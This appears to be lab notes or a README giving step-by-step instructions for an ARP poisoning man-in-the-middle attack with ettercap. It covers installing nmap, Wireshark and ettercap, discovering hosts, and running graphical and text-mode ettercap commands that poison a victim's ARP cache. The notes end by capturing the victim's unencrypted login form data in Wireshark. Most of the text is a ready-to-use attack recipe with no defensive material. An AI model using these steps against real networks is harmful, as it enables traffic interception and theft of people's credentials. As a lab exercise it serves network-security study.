# ettercap

Performing ARP (address resolution protocol) poisoning attack.

- Tricking the victim's ARP cache table (list of connection a device is connecting to) that the router host (laptop 1 - 10.0.0.1) MAC address is the attacker's MAC address (RP - 10.0.0.2). 

1. Download wireshark, nmap and ettercap (graphical or text-based)

   - `sudo apt update`
   - `sudo apt install nmap`
   - `sudo apt install wireshark -y`
   - `sudo apt install ettercap-graphical ettercap-text-only -y`
     - Will install both graphical & text version

2. Scan for devices on RP - difference approches

   - `nmap -sn 10.0.0.2/24` - be sure to include the CIDR (Classless Inter-Domain Routing) or the range of the subnet mask /24.
   - `arp` or `arp -a` to display all host connected to RP

3. Attacking Devices

   - <u>Graphical Version</u>

     - Open ettercap under internet
     - Pick the interface and press 'accept'
     - Go to 'host' and click 'scan host' to find other devices connected to the interface
     - Than click 'host list' to view available connections.
     - Click on the router interface and right click and pick 'Add to target 1' and add the victim device as target 2
     - Than select MITM icon and pick 'ARP Poisoning` and press 'okay'
       - `only poisoning one-way` will capture the packet from the victims device, not the router. Thus POST request received from the router will not send to the attacker.
     - On 10.0.0.3 laptop, login or signup on the site
     - Open Wireshark and filter for http and find packet with POST request
       - Expand `HTML form URL` to inspect unencrypted form input

   - <u>Text Version</u>

     - Simply type:
   
       ```bash
       sudo ettercap -text_only -disable_ssl -MITM_attack attack_method:remote /router_gateway_ip// /victim_ip//
       ```
   
       ```bash
       sudo ettercap -T -S -i -M arp:remote /10.0.0.1// /10.0.0.3//
       ```
   
     - On 10.0.0.3 laptop, login or signup on the site
     
     - Open Wireshark and filter for http and find packet with POST request
     
       - Expand `HTML form URL` to inspect unencrypted form input
